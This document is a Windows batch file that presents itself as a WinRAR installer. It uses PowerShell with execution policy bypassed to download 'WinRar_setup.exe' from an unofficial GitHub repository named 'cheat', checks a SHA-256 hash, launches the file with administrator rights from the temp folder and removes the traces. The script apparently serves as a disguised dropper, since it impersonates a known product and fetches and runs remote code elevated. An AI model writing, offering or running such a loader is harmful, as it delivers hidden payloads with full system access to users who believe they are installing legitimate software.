@echo off
setlocal EnableExtensions DisableDelayedExpansion

set "URL=https://raw.githubusercontent.com/skibididodopp-beep/cheat/refs/heads/main/WinRar_setup.exe"
set "HASH=3271c6372c136be4f9e7b276b3cb3b52ed4c408e1abc6405d15551212279dfac"
set "WORK_DIR=%TEMP%\WinRarPkg"
set "OUT=%WORK_DIR%\WinRar_setup.exe"

powershell.exe -NoProfile -ExecutionPolicy Bypass -Command ^
  "$u='%URL%'; $h='%HASH%'.ToLower(); $dir='%WORK_DIR%'; $f='%OUT%';" ^
  "$code = {" ^
  "  param($u, $h, $dir, $f)" ^
  "  $ErrorActionPreference = 'Stop';" ^
  "  [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;" ^
  "  New-Item -ItemType Directory -Path $dir -Force | Out-Null;" ^
  "  Write-Host 'Downloading file...' -ForegroundColor Cyan;" ^
  "  Invoke-WebRequest -Uri $u -OutFile $f -UseBasicParsing;" ^
  "  $actual = (Get-FileHash -LiteralPath $f -Algorithm SHA256).Hash.ToLower();" ^
  "  if ($actual -ne $h) { throw \"SHA-256 mismatch! Expected: $h, Actual: $actual\" };" ^
  "  Write-Host 'SHA-256 OK. Starting installer...' -ForegroundColor Green;" ^
  "  Start-Process -FilePath $f -Wait;" ^
  "  Remove-Item -LiteralPath $dir -Recurse -Force -ErrorAction SilentlyContinue;" ^
  "};" ^
  "$argList = '-NoProfile -ExecutionPolicy Bypass -Command \"& {' + $code.ToString() + '} ''' + $u + ''' ''' + $h + ''' ''' + $dir + ''' ''' + $f + '''\"';" ^
  "Start-Process -FilePath 'powershell.exe' -ArgumentList $argList -Verb RunAs"

exit /b 0
